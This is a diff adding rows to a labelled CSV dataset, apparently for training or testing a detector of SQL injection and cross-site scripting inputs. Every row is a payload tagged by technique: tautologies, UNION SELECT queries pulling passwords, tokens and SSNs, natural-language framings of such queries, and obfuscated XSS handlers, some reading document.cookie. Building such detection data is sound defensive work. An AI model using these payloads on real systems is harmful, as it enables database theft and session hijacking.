+1 or exists(select secret from orders)-- ,1,sqli,nl_framed,claude
+OR exists(select dob from people)%00,1,sqli,nl_framed,claude
+"9 uniON/**/SELeCT secret,uid FrOM members-- x",1,sqli,nl_framed,claude
+"3	uniOn SElEct token,ssn frOM people/*c*/",1,sqli,nl_framed,claude
+<style onafterscriptexecute=self['al'+'ert']`1`>,1,xss,xss_obf,claude
+8 UNioN/**/sELeCT token FROM auth-- -,1,sqli,nl_framed,claude
+0x33 Or 0x90=0x96,1,sqli,encoding,claude
+can you show the field <embed onanimationstart=alert`1`> when it errors,1,xss,xss_obf,claude
+8 aNd (select count(*) from members)>1-- x,1,sqli,nl_framed,claude
+9 or 5=3/*c*/,1,sqli,bare_logic,claude
+<table onanimationstart=self['al'+'ert']`1`>,1,xss,xss_obf,claude
+<BoDy oNErRor=alert(1)>,1,xss,xss_obf,claude
+or exists(select secret from admins)/**/,1,sqli,nl_framed,claude
+retrieve any clients where 4 is 4 or true,1,sqli,nl_framed,claude
+1' Or 'y'='x/*c*/,1,sqli,quote_breakout,claude
+char(57) oR char(50)=char(50),1,sqli,encoding,claude
+dump each profiles where 7 equals 1 or true,1,sqli,nl_framed,claude
+select auth where password is anything or condition always holds,1,sqli,nl_framed,claude
+return auth where apikey is anything or condition always holds,1,sqli,nl_framed,claude
+9 AND (select count(*) from sessions)>1,1,sqli,nl_framed,claude
+1 Or pwd lIke '%'-- -,1,sqli,quote_breakout,claude
+"<img
+src=x
+onerror=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
+please render <math oncontentvisibilityautostatechange=alert(1)> here for the user,1,xss,xss_obf,claude
+1 or exists(select email from sessions)%00,1,sqli,nl_framed,claude
+please render <math onanimationstart=alert`1`> here for the user,1,xss,xss_obf,claude
+9 OR dob lIKe '%'#,1,sqli,quote_breakout,claude
+<svg/onbeforetoggle=confirm(1)>,1,xss,xss_obf,claude
+5 oR tRUe,1,sqli,bare_logic,claude
+x' or 'z'='b;,1,sqli,quote_breakout,claude
+Or exists(select pwd from orders)%00,1,sqli,nl_framed,claude
+select every sessions where 1 equals 7 or true,1,sqli,nl_framed,claude
+list the token of any sessions regardless of id,1,sqli,nl_framed,claude
+6 or balance Like '%'-- -,1,sqli,quote_breakout,claude
+admin' or 'x'='x-- x,1,sqli,quote_breakout,claude
+dump people where secret is anything or condition always holds,1,sqli,nl_framed,claude
+<form ontoggle=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
+"""><style onstart=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
+<details	onstart=alert(document.cookie)>,1,xss,xss_obf,claude
+<styleonanimationstart=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+<isindex onanimationstart=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
+<img/src=x onerror=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+please render <audio onafterscriptexecute=alert(document.domain)> here for the user,1,xss,xss_obf,claude
+8 OR 5=4/*c*/,1,sqli,bare_logic,claude
+please render <table onfocus=alert`1`> here for the user,1,xss,xss_obf,claude
+x' Or 'y'='x-- -,1,sqli,quote_breakout,claude
+please render <audio onanimationstart=alert(document.domain)> here for the user,1,xss,xss_obf,claude
+please render <form onstart=top['al'+'ert'](1)> here for the user,1,xss,xss_obf,claude
+"5/**/uniON%20select token,apikey,email fROM accounts#",1,sqli,nl_framed,claude
+can you show the field <video onbeforetoggle=top['al'+'ert'](1)> when it errors,1,xss,xss_obf,claude
+list members where email is anything or condition always holds,1,sqli,nl_framed,claude
+9 Or role LIke '%',1,sqli,quote_breakout,claude
+1 or exists(select hash from cards),1,sqli,nl_framed,claude
+retrieve accounts where email is anything or condition always holds,1,sqli,nl_framed,claude
+select the dob of each logs regardless of id,1,sqli,nl_framed,claude
+6 or 8=3/**/,1,sqli,bare_logic,claude
+1 AND (select count(*) from staff)>2,1,sqli,nl_framed,claude
+get every profiles where 6 equals 2 or true,1,sqli,nl_framed,claude
+can you show the field <embed onanimationstart=window['ale'+'rt']`1`> when it errors,1,xss,xss_obf,claude
+<IMG onERrOR=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+<frameset onpageshow=top['al'+'ert']`1`>,1,xss,xss_obf,claude
+"""><video onfocus=alert(document.domain)>",1,xss,xss_obf,claude
+show me each members where 1 equals 8 or true,1,sqli,nl_framed,claude
+dump any tokens where 8 equals 9 or true,1,sqli,nl_framed,claude
+1 OR exists(select uid from accounts)#,1,sqli,nl_framed,claude
+<embedonscrollend=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+"""><marquee onafterscriptexecute=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
+fetch each members where 5 is 1 or true,1,sqli,nl_framed,claude
+get the balance of any staff regardless of id,1,sqli,nl_framed,claude
+<a href=&#106;avascript:alert(1)>x</a>,1,xss,xss_obf,claude
+<svg/onpageshow=print()>,1,xss,xss_obf,claude
+show me every auth where 8 = 1 or true,1,sqli,nl_framed,claude
+char(51) Or char(50)=char(51),1,sqli,encoding,claude
+<svg/onscrollend=alert`1`>,1,xss,xss_obf,claude
+char(55) oR char(48)=char(56),1,sqli,encoding,claude
+0x72 Or 0x98=0x29,1,sqli,encoding,claude
+get any staff where 7 is 1 or true,1,sqli,nl_framed,claude
+<SvG OneRROr=alert`1`>,1,xss,xss_obf,claude
+"""><keygen onstart=alert(document.domain)>",1,xss,xss_obf,claude
+3 or TrUe,1,sqli,bare_logic,claude
+9 anD (select count(*) from users)>3,1,sqli,nl_framed,claude
+char(56) Or char(52)=char(48),1,sqli,encoding,claude
+give any logs where 2 equals 4 or true,1,sqli,nl_framed,claude
+"""><keygen onbeforetoggle=confirm(1)>",1,xss,xss_obf,claude
+can you show the field <embed oncontentvisibilityautostatechange=alert`1`> when it errors,1,xss,xss_obf,claude
+3 AND (select count(*) from cards)>3,1,sqli,nl_framed,claude
+"""><video ontoggle=print()>",1,xss,xss_obf,claude
+1 oR exists(select dob from auth),1,sqli,nl_framed,claude
+7 or ssn LiKE '%'-- x,1,sqli,quote_breakout,claude
+<textarea onstart=top['al'+'ert']`1`>,1,xss,xss_obf,claude
+5%20UnioN%20sELeCT secret fROM cards,1,sqli,nl_framed,claude
+9 aNd (select count(*) from people)>3/**/,1,sqli,nl_framed,claude
+1' Or 'x'='a/*c*/,1,sqli,quote_breakout,claude
+fetch cards where pwd is anything or condition always holds,1,sqli,nl_framed,claude
+5 oR ssn likE '%'%00,1,sqli,quote_breakout,claude
+<img%20src=xonerror=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+<styleoncontentvisibilityautostatechange=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+"""><embed onbeforetoggle=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
+1 OR exists(select email from tokens)#,1,sqli,nl_framed,claude
+"<img	src=x
+onerror=top['al'+'ert'](1)>",1,xss,xss_obf,claude
+"""><iframe onanimationstart=print()>",1,xss,xss_obf,claude
+<iFrAmE oneRroR=print()>,1,xss,xss_obf,claude
+admin' oR 'x'='y/*c*/,1,sqli,quote_breakout,claude
+1 Or trUE,1,sqli,bare_logic,claude
+2 aNd (select count(*) from cards)>0%00,1,sqli,nl_framed,claude
+dump the pwd of every members regardless of id,1,sqli,nl_framed,claude
+<iFrAmE OnErROr=alert(1)>,1,xss,xss_obf,claude
+<embed%20onfocus=confirm(1)>,1,xss,xss_obf,claude
+admin' or 'y'='y-- -,1,sqli,quote_breakout,claude
+2 Or 2=8%00,1,sqli,bare_logic,claude
+7 OR TRUe,1,sqli,bare_logic,claude
+0x27 OR 0x55=0x68,1,sqli,encoding,claude
+1 AnD (select count(*) from staff)>2/*c*/,1,sqli,nl_framed,claude
+show me the uid of each members regardless of id,1,sqli,nl_framed,claude
+char(50) or char(57)=char(50),1,sqli,encoding,claude
+please render <svg onscrollend=alert(document.domain)> here for the user,1,xss,xss_obf,claude
+<select%09onbeforetoggle=print()>,1,xss,nl_framed,claude
+Or exists(select token from users)-- -,1,sqli,nl_framed,claude
+<embed onbeforetoggle=self['al'+'ert']`1`>,1,xss,xss_obf,claude
+get the apikey of each orders regardless of id,1,sqli,nl_framed,claude
+list every auth where 8 = 4 or true,1,sqli,nl_framed,claude
+"""><iframe onbeforetoggle=top['al'+'ert'](1)>",1,xss,xss_obf,claude
+can you show the field <textarea onload=window['ale'+'rt']`1`> when it errors,1,xss,xss_obf,claude
+fetch sessions where dob is anything or condition always holds,1,sqli,nl_framed,claude
+1 oR 1=1;,1,sqli,bare_logic,claude
+<svg/onerror=alert(document.domain)>,1,xss,xss_obf,claude
+6 ANd (select count(*) from tokens)>2-- x,1,sqli,nl_framed,claude
+can you show the field <body onpageshow=print()> when it errors,1,xss,xss_obf,claude
+"<keygen
+onpointerrawupdate=top['al'+'ert'](1)>",1,xss,xss_obf,claude
+5 or pwd liKE '%'/**/,1,sqli,quote_breakout,claude
+list the secret of all tokens regardless of id,1,sqli,nl_framed,claude
+return each auth where 7 equals 6 or true,1,sqli,nl_framed,claude
+return the role of any members regardless of id,1,sqli,nl_framed,claude
+"""><xss onstart=alert(document.domain)>",1,xss,xss_obf,claude
+char(52) or char(50)=char(56),1,sqli,encoding,claude
+fetch any tokens where 9 is 4 or true,1,sqli,nl_framed,claude
+<select ontoggle=top['al'+'ert']`1`>,1,xss,nl_framed,claude
+list sessions where role is anything or condition always holds,1,sqli,nl_framed,claude
+<object onafterscriptexecute=self['al'+'ert']`1`>,1,xss,xss_obf,claude
+1 AnD (select count(*) from members)>3#,1,sqli,nl_framed,claude
+0 OR 3=6/**/,1,sqli,bare_logic,claude
+1 or TrUe,1,sqli,bare_logic,claude
+give any logs where 5 equals 5 or true,1,sqli,nl_framed,claude
+can you show the field <style onbeforetoggle=alert(document.cookie)> when it errors,1,xss,xss_obf,claude
+0x81 Or 0x29=0x97,1,sqli,encoding,claude
+"<img
+src=x/onerror=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
+<img	src=xonerror=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+please render <form onstart=confirm(1)> here for the user,1,xss,xss_obf,claude
+5 aND (select count(*) from members)>1-- x,1,sqli,nl_framed,claude
+fetch the ssn of each accounts regardless of id,1,sqli,nl_framed,claude
+2 or email lIkE '%'/*c*/,1,sqli,quote_breakout,claude
+give any staff where 5 is 4 or true,1,sqli,nl_framed,claude
+<svg/onload=alert(document.cookie)>,1,xss,xss_obf,claude
+admin' oR 'a'='a/*c*/,1,sqli,quote_breakout,claude
+3 aND (select count(*) from admins)>1/**/,1,sqli,nl_framed,claude
+3 oR 6=7;,1,sqli,bare_logic,claude
+<isindex%20onbeforetoggle=alert(document.domain)>,1,xss,xss_obf,claude
+give each members where 8 is 8 or true,1,sqli,nl_framed,claude
+4%20uNiON sELecT ssn From users#,1,sqli,nl_framed,claude
+<SvG oneRroR=confirm(1)>,1,xss,xss_obf,claude
+"1 uNiON SeLECt dob,role,token From sessions%00",1,sqli,nl_framed,claude
+1 anD (select count(*) from staff)>1%00,1,sqli,nl_framed,claude
+can you show the field <details oncontentvisibilityautostatechange=alert(document.cookie)> when it errors,1,xss,xss_obf,claude
+1 ANd (select count(*) from tokens)>2-- x,1,sqli,nl_framed,claude
+list staff where uid is anything or condition always holds,1,sqli,nl_framed,claude
+"""><marquee oncontentvisibilityautostatechange=alert(document.domain)>",1,xss,xss_obf,claude
+"""><details onpointerrawupdate=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
+char(56) or char(57)=char(52),1,sqli,encoding,claude
+4 Or uid liKe '%'%00,1,sqli,quote_breakout,claude
+2 Or 1=7/*c*/,1,sqli,bare_logic,claude
+<svg/ontoggle=alert`1`>,1,xss,xss_obf,claude
+"8/**/Union/**/selECT password,ssn FrOM accounts%00",1,sqli,nl_framed,claude
+0x30 OR 0x18=0x71,1,sqli,encoding,claude
+1 oR exists(select hash from clients)/**/,1,sqli,nl_framed,claude
+select cards where token is anything or condition always holds,1,sqli,nl_framed,claude
+9 AnD (select count(*) from orders)>3%00,1,sqli,nl_framed,claude
+1 Or TRuE,1,sqli,bare_logic,claude
+2	UNiOn%20sELeCT role FRom members/*c*/,1,sqli,nl_framed,claude
+2 OR TRUe,1,sqli,bare_logic,claude
+<math onstart=self['al'+'ert']`1`>,1,xss,xss_obf,claude
+<BoDy onerrOR=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+<BoDy oNeRROr=alert(document.domain)>,1,xss,xss_obf,claude
+Or exists(select ssn from users)/*c*/,1,sqli,nl_framed,claude
+select any tokens where 4 is 3 or true,1,sqli,nl_framed,claude
+0x70 oR 0x20=0x67,1,sqli,encoding,claude
+5 OR 5=3-- ,1,sqli,bare_logic,claude
+"<imgsrc=x
+onerror=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
+8 and (select count(*) from auth)>0-- ,1,sqli,nl_framed,claude
+can you show the field <frameset onstart=alert(1)> when it errors,1,xss,xss_obf,claude
+7 oR tRUe,1,sqli,bare_logic,claude
+1 oR uid lIKE '%'/*c*/,1,sqli,quote_breakout,claude
+<img%09src=xonerror=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+get the secret of every sessions regardless of id,1,sqli,nl_framed,claude
+admin' OR 'z'='a-- -,1,sqli,quote_breakout,claude
+1 or exists(select ssn from accounts)#,1,sqli,nl_framed,claude
+6 Or TrUe,1,sqli,bare_logic,claude
+2 Or apikey LIKE '%'-- ,1,sqli,quote_breakout,claude
+can you show the field <video onafterscriptexecute=alert`1`> when it errors,1,xss,xss_obf,claude
+1' Or 'y'='z/*c*/,1,sqli,quote_breakout,claude
+x' or 'a'='z#,1,sqli,quote_breakout,claude
+8 And (select count(*) from tokens)>2-- -,1,sqli,nl_framed,claude
+<BoDy OnerRoR=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+can you show the field <textarea oncontentvisibilityautostatechange=alert(1)> when it errors,1,xss,xss_obf,claude
+please render <input onbeforetoggle=window['ale'+'rt']`1`> here for the user,1,xss,xss_obf,claude
+9 Or 3=5#,1,sqli,bare_logic,claude
+list the hash of all profiles regardless of id,1,sqli,nl_framed,claude
+x' Or 'b'='z;,1,sqli,quote_breakout,claude
+please render <style onstart=top['al'+'ert'](1)> here for the user,1,xss,xss_obf,claude
+8 OR hash lIKe '%'/*c*/,1,sqli,quote_breakout,claude
+"""><embed ontoggle=alert(1)>",1,xss,xss_obf,claude
+1' or 'z'='y-- -,1,sqli,quote_breakout,claude
+6 oR 9=4-- ,1,sqli,bare_logic,claude
+root' oR 'a'='a/**/,1,sqli,quote_breakout,claude
+can you show the field <video onafterscriptexecute=alert(document.domain)> when it errors,1,xss,xss_obf,claude
+8 OR 3=5-- ,1,sqli,bare_logic,claude
+"""><frameset onpointerrawupdate=alert(document.domain)>",1,xss,xss_obf,claude
+get users where secret is anything or condition always holds,1,sqli,nl_framed,claude
+<img%20src=x onerror=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+9 or 2=8,1,sqli,bare_logic,claude
+"""><math onanimationstart=alert`1`>",1,xss,xss_obf,claude
+x' or 'x'='x-- ,1,sqli,quote_breakout,claude
+please render <xss onerror=top['al'+'ert'](1)> here for the user,1,xss,xss_obf,claude
+0x99 OR 0x81=0x99,1,sqli,encoding,claude
+"7 UNIoN/**/SeLecT secret,ssn fROM accounts",1,sqli,nl_framed,claude
+<img%20src=x%20onerror=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+3 oR tRue,1,sqli,bare_logic,claude
+1 or exists(select secret from users)-- -,1,sqli,nl_framed,claude
+admin' OR 'y'='y;,1,sqli,quote_breakout,claude
+fetch orders where email is anything or condition always holds,1,sqli,nl_framed,claude
+<iFrAmE OnErRor=confirm(1)>,1,xss,xss_obf,claude
+"<frameset
+onscrollend=print()>",1,xss,xss_obf,claude
+<audio onbeforetoggle=confirm(1)>,1,xss,xss_obf,claude
+"<img/src=x
+onerror=confirm(1)>",1,xss,xss_obf,claude
+fetch the hash of every staff regardless of id,1,sqli,nl_framed,claude
+<isindex onpointerrawupdate=window['al'+'ert']`1`>,1,xss,xss_obf,claude
+"""><math oncontentvisibilityautostatechange=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
+please render <embed oncontentvisibilityautostatechange=window['ale'+'rt']`1`> here for the user,1,xss,xss_obf,claude
+return any users where 4 equals 8 or true,1,sqli,nl_framed,claude
+1 uNiOn/**/SELECt role FrOm profiles-- ,1,sqli,nl_framed,claude
+5 And (select count(*) from clients)>2%00,1,sqli,nl_framed,claude
+dump the role of every sessions regardless of id,1,sqli,nl_framed,claude
+7 and (select count(*) from clients)>0/**/,1,sqli,nl_framed,claude
+can you show the field <textarea onbeforetoggle=alert(1)> when it errors,1,xss,xss_obf,claude
+<img	src=x/onerror=alert`1`>,1,xss,xss_obf,claude
+retrieve orders where email is anything or condition always holds,1,sqli,nl_framed,claude
+char(56) oR char(49)=char(50),1,sqli,encoding,claude
+select logs where role is anything or condition always holds,1,sqli,nl_framed,claude
+7 OR TrUE,1,sqli,bare_logic,claude
+0x39 OR 0x57=0x69,1,sqli,encoding,claude
+get cards where uid is anything or condition always holds,1,sqli,nl_framed,claude
+0x82 or 0x61=0x80,1,sqli,encoding,claude
+<img src=x onerror=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+char(52) or char(50)=char(57),1,sqli,encoding,claude
+1 OR exists(select hash from sessions)/*c*/,1,sqli,nl_framed,claude
+x' or 'z'='a#,1,sqli,quote_breakout,claude
+can you show the field <form onfocus=alert`1`> when it errors,1,xss,xss_obf,claude
+1 OR token liKe '%';,1,sqli,quote_breakout,claude
+<imgsrc=x%09onerror=alert(document.cookie)>,1,xss,xss_obf,claude
+list every logs where 1 = 1 or true,1,sqli,nl_framed,claude
+4 or role lIKe '%'#,1,sqli,quote_breakout,claude
+"2/**/uNiON/**/SeLect pwd,role,hash FrOm sessions%00",1,sqli,nl_framed,claude
+fetch the pwd of every auth regardless of id,1,sqli,nl_framed,claude
+<img%09src=x	onerror=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+<svg/onstart=print()>,1,xss,xss_obf,claude
+give the hash of any members regardless of id,1,sqli,nl_framed,claude
+0x18 oR 0x63=0x51,1,sqli,encoding,claude
+char(57) oR char(51)=char(55),1,sqli,encoding,claude
+"""><details onbeforetoggle=print()>",1,xss,xss_obf,claude
+1 OR 3=5-- ,1,sqli,bare_logic,claude
+"<video
+onerror=alert(1)>",1,xss,xss_obf,claude
+<svg/ontoggle=alert(1)>,1,xss,xss_obf,claude
+6%20UNion%20sELEcT pwd FroM clients/*c*/,1,sqli,nl_framed,claude
+0x61 or 0x77=0x28,1,sqli,encoding,claude
+1 Or ssn LiKe '%'%00,1,sqli,quote_breakout,claude
+6 OR TRuE,1,sqli,bare_logic,claude
+3 oR apikey like '%'/**/,1,sqli,quote_breakout,claude
+return all cards where 8 equals 2 or true,1,sqli,nl_framed,claude
+char(55) OR char(56)=char(55),1,sqli,encoding,claude
+3 OR 7=7/*c*/,1,sqli,bare_logic,claude
+6 or 6=1-- -,1,sqli,bare_logic,claude
+1 oR exists(select ssn from people);,1,sqli,nl_framed,claude
+char(50) or char(53)=char(55),1,sqli,encoding,claude
+x' Or 'z'='b#,1,sqli,quote_breakout,claude
+6 Or TRUE,1,sqli,bare_logic,claude
+0x89 oR 0x52=0x31,1,sqli,encoding,claude
+<img%09src=x/onerror=alert(document.cookie)>,1,xss,xss_obf,claude
+please render <keygen onerror=eval(atob('YWxlcnQoMSk'))> here for the user,1,xss,xss_obf,claude
+1 Or exists(select ssn from users)%00,1,sqli,nl_framed,claude
+<object%09onbeforetoggle=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+5 Or 4=3#,1,sqli,bare_logic,claude
+"""><object ontoggle=top['al'+'ert'](1)>",1,xss,xss_obf,claude
+show me the email of all logs regardless of id,1,sqli,nl_framed,claude
+});alert(document.cookie);//,1,xss,xss_obf,claude
+list the hash of all tokens regardless of id,1,sqli,nl_framed,claude
+give the ssn of each admins regardless of id,1,sqli,nl_framed,claude
+6 oR 2=3/*c*/,1,sqli,bare_logic,claude
+dump all tokens where 6 = 6 or true,1,sqli,nl_framed,claude
+7 or email LIKe '%'/**/,1,sqli,quote_breakout,claude
+show me every clients where 6 equals 7 or true,1,sqli,nl_framed,claude
+1' or 'a'='x,1,sqli,quote_breakout,claude
+0x52 oR 0x22=0x63,1,sqli,encoding,claude
+0x53 or 0x60=0x79,1,sqli,encoding,claude
+"4 UniON seLecT password,ssn FROM profiles-- x",1,sqli,nl_framed,claude
+can you show the field <xss onbeforetoggle=alert`1`> when it errors,1,xss,xss_obf,claude
+can you show the field <table onanimationstart=eval(atob('YWxlcnQoMSk'))> when it errors,1,xss,xss_obf,claude
+<img/src=x	onerror=alert(1)>,1,xss,xss_obf,claude
+1' OR 'x'='a%00,1,sqli,quote_breakout,claude
+0x69 oR 0x38=0x83,1,sqli,encoding,claude
+fetch the uid of all cards regardless of id,1,sqli,nl_framed,claude
+char(53) OR char(53)=char(53),1,sqli,encoding,claude
+"1	unION%20SeLeCt token,secret froM admins-- ",1,sqli,nl_framed,claude
+3 OR trUE,1,sqli,bare_logic,claude
+please render <svg onpointerrawupdate=print()> here for the user,1,xss,xss_obf,claude
+please render <style onbeforetoggle=print()> here for the user,1,xss,xss_obf,claude
+0 OR 1=1;,1,sqli,bare_logic,claude
+dump members where apikey is anything or condition always holds,1,sqli,nl_framed,claude
+0x55 Or 0x99=0x83,1,sqli,encoding,claude
+<svg/onfocus=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+<IMG OnERroR=print()>,1,xss,xss_obf,claude
+give any tokens where 5 equals 8 or true,1,sqli,nl_framed,claude
+fetch any staff where 9 equals 5 or true,1,sqli,nl_framed,claude
+"8%20unIoN%20selECT token,hash,email FROm clients-- x",1,sqli,nl_framed,claude
+7 or trUe,1,sqli,bare_logic,claude
+2 Or truE,1,sqli,bare_logic,claude
+1 OR exists(select ssn from members)#,1,sqli,nl_framed,claude
+fetch the dob of any admins regardless of id,1,sqli,nl_framed,claude
+select the email of each clients regardless of id,1,sqli,nl_framed,claude
+can you show the field <xss onafterscriptexecute=window['ale'+'rt']`1`> when it errors,1,xss,xss_obf,claude
+<svg/ontoggle=alert(document.cookie)>,1,xss,xss_obf,claude
+give any auth where 4 = 7 or true,1,sqli,nl_framed,claude
+6 AnD (select count(*) from auth)>2-- -,1,sqli,nl_framed,claude
+<IMG OnErroR=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+<svg/onbeforetoggle=print()>,1,xss,xss_obf,claude
+6 Or TruE,1,sqli,bare_logic,claude
+1 or exists(select email from tokens)-- ,1,sqli,nl_framed,claude
+<svg/onerror=print()>,1,xss,xss_obf,claude
+<svg/onload=alert`1`>,1,xss,xss_obf,claude
+0x64 oR 0x43=0x48,1,sqli,encoding,claude
+char(50) Or char(54)=char(48),1,sqli,encoding,claude
+<embed onanimationstart=top['al'+'ert']`1`>,1,xss,xss_obf,claude
+root' or 'y'='x-- ,1,sqli,quote_breakout,claude
+0x42 oR 0x99=0x94,1,sqli,encoding,claude
+char(51) or char(53)=char(56),1,sqli,encoding,claude
+please render <video onscrollend=eval(atob('YWxlcnQoMSk'))> here for the user,1,xss,xss_obf,claude
+"7%20unIoN selEcT hash,apikey,ssn from clients;",1,sqli,nl_framed,claude
+7 aND (select count(*) from members)>3-- x,1,sqli,nl_framed,claude
+6 OR 4=5,1,sqli,bare_logic,claude
+1 OR exists(select email from users)/*c*/,1,sqli,nl_framed,claude
+9	uniON%20seleCt hash FROM orders,1,sqli,nl_framed,claude
+select tokens where balance is anything or condition always holds,1,sqli,nl_framed,claude
+0x62 OR 0x72=0x62,1,sqli,encoding,claude
+please render <isindex onstart=alert(1)> here for the user,1,xss,xss_obf,claude
+2 Or 3=5-- x,1,sqli,bare_logic,claude
+get cards where token is anything or condition always holds,1,sqli,nl_framed,claude
+get staff where password is anything or condition always holds,1,sqli,nl_framed,claude
+"""><isindex onfocus=confirm(1)>",1,xss,xss_obf,claude
+root' oR 'y'='x-- -,1,sqli,quote_breakout,claude
+<SvG OnErrOr=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+"""><video onanimationstart=top['al'+'ert'](1)>",1,xss,xss_obf,claude
+dump the secret of all auth regardless of id,1,sqli,nl_framed,claude
+"""><xss onpageshow=alert(1)>",1,xss,xss_obf,claude
+<SvG ONerRoR=alert(document.domain)>,1,xss,xss_obf,claude
+"5 uniOn sELEcT dob,password,hash FROM clients",1,sqli,nl_framed,claude
+7 Or 6=6-- x,1,sqli,bare_logic,claude
+0x21 Or 0x76=0x98,1,sqli,encoding,claude
+please render <object onfocus=window['ale'+'rt']`1`> here for the user,1,xss,xss_obf,claude
+can you show the field <isindex ontoggle=alert`1`> when it errors,1,xss,xss_obf,claude
+<svg/onafterscriptexecute=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+<IMG onERRor=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+"9%20UNIOn/**/SElECT token,password frOm auth",1,sqli,nl_framed,claude
+3 Or true,1,sqli,bare_logic,claude
+fetch all members where 3 is 3 or true,1,sqli,nl_framed,claude
+7 or 1=4-- ,1,sqli,bare_logic,claude
+please render <iframe onpageshow=eval(atob('YWxlcnQoMSk'))> here for the user,1,xss,xss_obf,claude
+1' oR 'x'='b/**/,1,sqli,quote_breakout,claude
+oR exists(select dob from members)#,1,sqli,nl_framed,claude
+show me admins where password is anything or condition always holds,1,sqli,nl_framed,claude
+6 oR 8=8-- ,1,sqli,bare_logic,claude
+dump sessions where uid is anything or condition always holds,1,sqli,nl_framed,claude
+can you show the field <textarea onpageshow=print()> when it errors,1,xss,xss_obf,claude
+8 and (select count(*) from tokens)>1#,1,sqli,nl_framed,claude
+6 Or uid lIkE '%';,1,sqli,quote_breakout,claude
+please render <frameset onerror=print()> here for the user,1,xss,xss_obf,claude
+admin' OR 'z'='x/*c*/,1,sqli,quote_breakout,claude
+9 AnD (select count(*) from members)>0%00,1,sqli,nl_framed,claude
+6/**/uNioN SELecT apikey FRom cards/**/,1,sqli,nl_framed,claude
+<SvG oNerRoR=alert(document.cookie)>,1,xss,xss_obf,claude
+please render <xss onanimationstart=top['al'+'ert'](1)> here for the user,1,xss,xss_obf,claude
+return accounts where pwd is anything or condition always holds,1,sqli,nl_framed,claude
+dump clients where secret is anything or condition always holds,1,sqli,nl_framed,claude
+1 or exists(select hash from admins),1,sqli,nl_framed,claude
+5 oR trUE,1,sqli,bare_logic,claude
+1 Or exists(select email from users)-- x,1,sqli,nl_framed,claude
+please render <form onbeforetoggle=confirm(1)> here for the user,1,xss,xss_obf,claude
+please render <svg onpageshow=window['ale'+'rt']`1`> here for the user,1,xss,xss_obf,claude
+char(55) oR char(52)=char(49),1,sqli,encoding,claude
+1 OR exists(select password from sessions)-- x,1,sqli,nl_framed,claude
+4 or secret LiKe '%'#,1,sqli,quote_breakout,claude
+"<form
+onbeforetoggle=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
+"""><table onpointerrawupdate=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
+x' OR 'y'='z/**/,1,sqli,quote_breakout,claude
+"5/**/unIon/**/seLeCT email,pwd,secret fROM tokens-- x",1,sqli,nl_framed,claude
+<SvG OnErroR=alert(1)>,1,xss,xss_obf,claude
+return each people where 2 = 9 or true,1,sqli,nl_framed,claude
+"2 UNION%20Select apikey,balance,hash FroM admins;",1,sqli,nl_framed,claude
+admin' Or '1'='1,1,sqli,quote_breakout,claude
+});alert(1);//,1,xss,xss_obf,claude
+root' oR 'z'='z,1,sqli,quote_breakout,claude
+"""><embed ontoggle=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
+7 aNd (select count(*) from cards)>2;,1,sqli,nl_framed,claude
+<select%20ontoggle=alert(document.cookie)>,1,xss,nl_framed,claude
+<BoDy onerrOR=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+5 or tRUe,1,sqli,bare_logic,claude
+<details ontoggle=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
+0x61 oR 0x63=0x16,1,sqli,encoding,claude
+show me accounts where hash is anything or condition always holds,1,sqli,nl_framed,claude
+"""><keygen onpageshow=alert`1`>",1,xss,xss_obf,claude
+<embed onscrollend=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+"<imgsrc=x
+onerror=print()>",1,xss,xss_obf,claude
+"""><svg ontoggle=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
+0 oR 3=5-- -,1,sqli,bare_logic,claude
+});window['ale'+'rt']`1`;//,1,xss,xss_obf,claude
+"""><object onload=alert(1)>",1,xss,xss_obf,claude
+<IMG ONErROR=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+retrieve admins where balance is anything or condition always holds,1,sqli,nl_framed,claude
+char(48) oR char(48)=char(55),1,sqli,encoding,claude
+6 Or true,1,sqli,bare_logic,claude
+4 And (select count(*) from users)>0;,1,sqli,nl_framed,claude
+"2%20UniON SEleCt ssn,email frOM admins;",1,sqli,nl_framed,claude
+1 And (select count(*) from people)>0#,1,sqli,nl_framed,claude
+please render <video onload=alert(document.cookie)> here for the user,1,xss,xss_obf,claude
+2 OR TRue,1,sqli,bare_logic,claude
+give each logs where 5 is 8 or true,1,sqli,nl_framed,claude
+list every clients where 6 equals 4 or true,1,sqli,nl_framed,claude
+1 And (select count(*) from logs)>1-- x,1,sqli,nl_framed,claude
+<keygen onbeforetoggle=self['al'+'ert']`1`>,1,xss,xss_obf,claude
+5 OR 6=9-- -,1,sqli,bare_logic,claude
